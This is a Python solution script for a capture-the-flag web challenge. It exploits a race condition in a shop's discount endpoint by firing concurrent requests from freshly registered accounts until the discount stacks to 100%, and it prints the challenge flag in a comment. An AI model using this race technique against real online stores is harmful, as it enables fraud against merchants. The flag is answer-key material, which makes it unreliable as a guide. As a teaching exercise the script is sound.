#!/usr/bin/env python3

# flag{that_was_expensiv_did_you_get_a_mega_discount_?}

# The flag is an item to be bought but the available money are not enough.
# There is a race condition in apply_discount view.
# The discount if first applied to the cart and after that is deleted.
# So, it is possible to apply multiple times the same discount if you are fast enough.
# The initial discount is 50%. Multiple discounts are summed together.
# By applying two times the same discount it is possible to obtain 100%.
# After that, the flag can be bought for free.


import random
import string
import requests
import threading
import time

URL = "http://discount.ctf.offdef.it"

# very simple way for multithread communication
found = False


def register(session, username, password):
    url = "%s/register" % URL
    payload = {"username": username, "password": password}
    r = session.post(url, data=payload)
    return r.text


def login(session, username, password):
    url = "%s/login" % URL
    payload = {"username": username, "password": password}
    r = session.post(url, data=payload)
    return r.text


def add_to_cart(session, item_id):
    url = "%s/add_to_cart?item_id=%d" % (URL, item_id)
    r = session.get(url)
    return r.text


def pay_cart(session):
    url = "%s/cart/pay" % URL
    r = session.get(url)
    return r.text


def apply_discount(session, discount_code):
    # import global found to communicate with the main thread
    global found

    url = "%s/apply_discount" % URL
    payload = {"discount": discount_code}
    r = session.post(url, data=payload)

    # check for flag and print output
    if "Current Discount Rate: 100%" in r.text:
        print(r.text)
        found = True
        res = pay_cart(session)
        print(res)

    return r.text


def random_string():
    k = random.randint(6, 15)
    allowed_chars = string.ascii_letters
    return "".join(random.choices(allowed_chars, k=k))


# extract_discount_code from register response
def extract_discount_code(res):
    lines = res.split("\n")

    i = 0
    while "Use your discount code! Code: " not in lines[i]:
        i += 1
        continue

    discount_code = lines[i][-16:-6]
    return discount_code


# test calls

# flag is an item with id 21
# it must be added to the cart and then bought
flag_item_id = 21

session = requests.Session()
username = random_string()
password = random_string()

res = register(session, username, password)
assert "Registration completed!" in res

discount_code = extract_discount_code(res)
assert len(discount_code) == 10

res = login(session, username, password)
assert "Welcome back!" in res

res = add_to_cart(session, flag_item_id)
assert "Item added to the Cart!" in res

res = apply_discount(session, discount_code)
assert "Current Discount Rate: 50%" in res

# the flag is very expensive
res = pay_cart(session)
assert "Not enough money!" in res

# start exploit
count = 0
while not found:
    print("Try ", count + 1)

    # You cannot apply the same discount twice if it has been deleted.
    # So, it is necessary to create a new user every time.
    # In this way it is possibile to obtain a new valid discount code.

    session = requests.Session()
    username = random_string()
    password = random_string()

    res = register(session, username, password)
    discount_code = extract_discount_code(res)
    res = add_to_cart(session, flag_item_id)

    t_discount_1 = threading.Thread(
        target=apply_discount,
        args=(session, discount_code)
    )

    t_discount_2 = threading.Thread(
        target=apply_discount,
        args=(session, discount_code)
    )

    t_discount_1.start()
    t_discount_2.start()

    # wait for the threads to finish
    t_discount_1.join(timeout=1)
    t_discount_2.join(timeout=1)

    count += 1
